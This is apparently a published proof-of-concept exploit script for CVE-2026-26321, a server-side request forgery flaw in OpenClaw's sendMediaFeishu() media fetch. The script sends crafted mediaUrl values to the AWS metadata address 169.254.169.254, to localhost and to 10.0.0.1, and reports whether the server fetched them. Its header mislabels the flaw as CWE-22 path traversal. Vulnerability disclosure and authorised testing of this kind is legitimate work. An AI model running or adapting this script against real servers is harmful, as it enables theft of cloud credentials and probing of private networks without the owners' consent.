#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenClaw < 2026.2.14 - SSRF via sendMediaFeishu()
# CVE            : CVE-2026-26321
# Vendor         : OpenClaw
# Product        : OpenClaw
# Affected       : < 2026.2.14
# Type           : CWE-22 - Path Traversal
# CVSS           : 7.5 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2026-26321 — PoC Vector 2: SSRF via bare fetch() in sendMediaFeishu()

When mediaUrl is a remote URL (http/https), sendMediaFeishu() calls fetch(mediaUrl)
with no SSRF protection — no DNS rebinding checks, no private IP blocking.

USAGE:
  python3 poc_vector2_ssrf.py <host> <port>
  python3 poc_vector2_ssrf.py localhost 8632
"""

import sys
import json
import urllib.request
import urllib.error


def api_post(base_url, endpoint, payload):
    """POST JSON to the harness and return the parsed response."""
    url = f"{base_url}{endpoint}"
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode("utf-8")), resp.status
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        return body, e.code
    except Exception as e:
        return {"status": "error", "error": str(e)}, 0


def check_health(base_url):
    try:
        req = urllib.request.Request(f"{base_url}/health")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status == 200
    except Exception:
        return False


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"Example: {sys.argv[0]} localhost 8632")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    base_url = f"http://{host}:{port}"

    print("""
======================================================================
  CVE-2026-26321 — Vector 2: SSRF via sendMediaFeishu()
  Bare fetch() without SSRF protection
======================================================================
""")

    print(f"  Target: {base_url}")
    print()

    print("[*] Checking target...", end=" ")
    if not check_health(base_url):
        print("FAILED")
        sys.exit(1)
    print("OK")
    print()

    results = {}

    # Test 1: AWS metadata endpoint (classic SSRF target)
    print("[*] Test 1: SSRF to AWS metadata endpoint (169.254.169.254)")
    resp, _ = api_post(base_url, "/media", {
        "mediaUrl": "http://169.254.169.254/latest/meta-data/"
    })
    # In a non-AWS environment, this will fail with connection error — that's expected.
    # The key proof is that isLocalPath=false AND the fetch was attempted.
    if resp.get("type") == "ssrf_fetch":
        print(f"    [+] SSRF fetch attempted (isLocalPath={resp.get('isLocalPath')})")
        if resp.get("status") == "ok":
            print(f"    [+] Response received — HTTP {resp.get('httpStatus')}")
        else:
            print(f"    [+] Connection error (expected outside AWS): {resp.get('error', '')[:80]}")
        print("    [+] Confirms: fetch() called with no SSRF validation")
        results["AWS metadata SSRF"] = True
    else:
        print(f"    [-] Unexpected response: {resp}")
        results["AWS metadata SSRF"] = False
    print()

    # Test 2: Internal service probing (localhost)
    print("[*] Test 2: SSRF to localhost services")
    resp, _ = api_post(base_url, "/media", {
        "mediaUrl": "http://127.0.0.1:8080/health"
    })
    if resp.get("type") == "ssrf_fetch":
        print(f"    [+] SSRF fetch attempted to localhost")
        if resp.get("status") == "ok":
            print(f"    [+] Localhost responded — HTTP {resp.get('httpStatus')}")
            print(f"    [+] Content: {resp.get('content', '')[:100]}")
        else:
            print(f"    [+] Connection result: {resp.get('error', '')[:80]}")
        print("    [+] Confirms: no private IP blocking")
        results["Localhost SSRF"] = True
    else:
        results["Localhost SSRF"] = False
    print()

    # Test 3: Internal network probing
    print("[*] Test 3: SSRF to internal network (10.0.0.1)")
    resp, _ = api_post(base_url, "/media", {
        "mediaUrl": "http://10.0.0.1/"
    })
    if resp.get("type") == "ssrf_fetch":
        print(f"    [+] SSRF fetch attempted to internal network")
        error = resp.get("error", "")
        if resp.get("status") == "ok":
            print(f"    [+] Internal host responded — HTTP {resp.get('httpStatus')}")
        else:
            print(f"    [+] Connection result: {error[:80]}")
        print("    [+] Confirms: no private IP blocking on RFC1918 ranges")
        results["Internal SSRF"] = True
    else:
        results["Internal SSRF"] = False
    print()

    # Summary
    print("=" * 60)
    print("  RESULTS SUMMARY — SSRF Vector")
    print("=" * 60)
    for name, passed in results.items():
        icon = "+" if passed else "-"
        status = "PASS" if passed else "FAIL"
        print(f"  [{icon}] {status}: {name}")

    print()
    passed = sum(1 for v in results.values() if v)
    if passed > 0:
        print("[CONFIRMED] SSRF via sendMediaFeishu() bare fetch() — no SSRF protection")
    else:
        print("[UNVERIFIED] Tests did not pass as expected")
    print()
    return 0 if passed > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
